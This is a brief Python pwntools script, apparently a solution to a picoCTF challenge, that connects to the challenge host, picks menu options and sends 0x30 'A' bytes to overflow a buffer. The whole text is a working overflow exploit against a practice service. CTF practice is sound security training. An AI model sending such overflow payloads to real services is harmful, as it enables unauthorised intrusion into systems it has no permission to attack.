from pwn import *
HOST = "tethys.picoctf.net"
PORT = 60488
with remote(HOST, PORT) as r:
    print(r.recv().decode())
    r.sendline(b"2")
    print(r.recv().decode())
    r.sendline(b"A" * 0x30)
    print(r.recv().decode())
    r.sendline(b"4")
    print(r.recv().decode())